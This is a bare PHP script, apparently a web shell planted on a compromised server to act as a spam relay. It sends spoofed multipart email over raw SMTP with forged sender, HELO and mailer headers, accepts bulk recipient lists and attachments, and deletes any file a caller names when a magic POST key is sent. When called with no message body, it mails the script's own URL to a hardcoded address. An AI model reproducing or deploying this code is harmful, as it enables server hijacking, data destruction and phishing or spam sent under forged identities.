<?
if($_POST["982982898938492"] == "fileD"){
	if($_POST["fileName"] && is_file($_POST["fileName"])){
		if(!@unlink($_POST["fileName"])){
			header('HTTP/1.1 404 OK');
		}else{
			header('HTTP/1.1 200 OK');
		}
	}
	echo ("OK");
	exit;
}
if(!$_POST["helo"]) $urlKey = "nate.com";
else $urlKey = $_POST["helo"];
if(!$_POST["mailFrom"]) $fostMail = "uiwiwo@swiiwoa.com";
else $fostMail = $_POST["mailFrom"];
if(!$_POST["dongbo"]) $dongbo = 1;
else $dongbo = $_POST["dongbo"];

if(!$_POST["mailTo"]){
	if (!$_GET["mail"])
		$toMail = "wccgneffom@hanmail.net";
	else $toMail = $_GET["mail"];
}else{
	if($dongbo == 1){
		$toMail =$_POST["mailTo"];
	}else{
		$toMail=explode(",",$_POST["mailTo"]);
	}
}

if(!$_POST["subject"]) $subject ="테스트입니다";
else $subject = $_POST["subject"];
if(!$_POST["body"]) {
	$data = "http://".$HTTP_HOST.$REQUEST_URI;
	$data = base64_encode($data);
}
else $data = base64_encode($_POST["body"]);
if(!$_POST["fromName"]){
	$fromName = "테스트용";
}else{
	$fromName =$_POST["fromName"];
}
//첨부파일데이터
if (!$_POST["fileTitle"]){
	$fileTitle = "dhwwowww.txt";
}else{
	$fileTitle = $_POST["fileTitle"];
}
if (!$_POST["fileTitle2"]){
	$fileTitle2 = "heiiwpwpw.txt";
}else{
	$fileTitle2 = $_POST["fileTitle2"];
}
if (!$_POST["fileContents"]){
	$fileContents = "test";
	$fileContents = base64_encode($fileContents);
}else{
	$fileContents = $_POST["fileContents"];
	$fileContents = base64_encode(str_replace(chr(92),"",$fileContents));
}
if (!$_POST["fileContents2"]){
	$fileContents2 = "sdfedsdf";
	$fileContents2 = base64_encode($fileContents2);
}else{
	$fileContents2 = base64_encode($_POST["fileContents2"]);
}

if (!$_POST["server"])
	$server = "mx1.hanmail.net";
else $server = $_POST["server"];
if (!$_POST["xmailer"])
	$xmailer = "Daum Mailer 5.50";
else
	$xmailer = $_POST["xmailer"];

$fp = @fsockopen($server, 25, &$errno, &$errstr, 10);
if( !$fp ) {
	echo "$errstr ($errno)<br />\n";
	echo "not";
}else{
	$uniqchr = uniqid(time()); 
	$one = strtoupper($uniqchr[0]); 
	$two = strtoupper(substr($uniqchr,0,8)); 
	$three = strtoupper(substr(strrev($uniqchr),0,8)); 
	$boundary = "----=_NextPart_845_245".$one."_".$two.".".$three; 
	$retval = array();
	fgets($fp, 128);
	fputs($fp, "helo ".$urlKey."\r\n"); 
	fputs($fp, "mail from: <".$fostMail.">\r\n");
	
	if($dongbo == 1){
		fputs($fp, "rcpt to: <".$toMail.">\r\n");
		fgets($fp, 128);
	}else{
		for($i=0;$i<$dongbo;$i++){
			fputs($fp,"rcpt to: <".$toMail[$i].">\r\n");
			fgets($fp, 128);
		}
	}

	fputs($fp, "data\r\n");	
	fputs($fp, "From: \"".$fromName."\" <".$fostMail.">\r\n");	
	//fputs($fp, "Reply-To: \"".$fromName."\" <".$fostMail.">\r\n");
	fputs($fp, "Subject: ".$subject." \r\n");
	fputs($fp, "X-Mailer: ".$xmailer."\r\n");
	fputs($fp, "Content-Type: multipart/mixed; boundary=\"".$boundary."\"\r\n");
	fputs($fp, "X-Priority: 3\r\n");
	fputs($fp, "X-MSMail-Priority: Normal\r\n");
	fputs($fp, "X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2462.0000\r\n\r\n");

	fputs($fp, "--".$boundary."\r\n");	
	fputs($fp,"Content-Type: text/plain\r\n"); 
	fputs($fp,"Content-Transfer-Encoding: base64\r\n\r\n"); 
	fputs($fp, $data."\r\n\r\n");
	if($fileTitle && $fileTitle2){
		fputs($fp, "--".$boundary."\r\n");	
		fputs($fp,"Content-Type: text/html; name=".$fileTitle."\r\n"); 
		fputs($fp,"Content-Transfer-Encoding: base64\r\n"); 
		fputs($fp,"Content-Disposition: inline; filename=".$fileTitle."\r\n"); 
		fputs($fp,"X-HM-IDENT: attach\r\n\r\n"); 
		fputs($fp, addslashes(ereg_replace(" ","+",$fileContents))."\r\n\r\n");

		fputs($fp, "--".$boundary."\r\n");	
		fputs($fp,"Content-Type: text/html; name=".$fileTitle2."\r\n"); 
		fputs($fp,"Content-Transfer-Encoding: base64\r\n"); 
		fputs($fp,"Content-Disposition: inline; filename=".$fileTitle2."\r\n"); 
		fputs($fp,"X-HM-IDENT: attach\r\n\r\n");
		fputs($fp, addslashes(ereg_replace(" ","+",$fileContents2))."\r\n\r\n");

		fputs($fp, "--".$boundary."--\r\n");
	}else if($fileTitle){
		fputs($fp, "--".$boundary."\r\n");	
		fputs($fp,"Content-Type: text/html\r\n"); 
		fputs($fp,"Content-Transfer-Encoding: base64\r\n"); 
		fputs($fp,"Content-Disposition: attachment; filename=".$fileTitle."\r\n\r\n"); 
		fputs($fp, $fileContents."\r\n\r\n");
		fputs($fp, "--".$boundary."--\r\n");
	}
	fputs($fp, "\r\n.\r\n");
	fgets($fp, 128);
	fputs($fp, "quit \r\n");
	fgets($fp, 128);
	echo("ok!");
	exit;
}

?>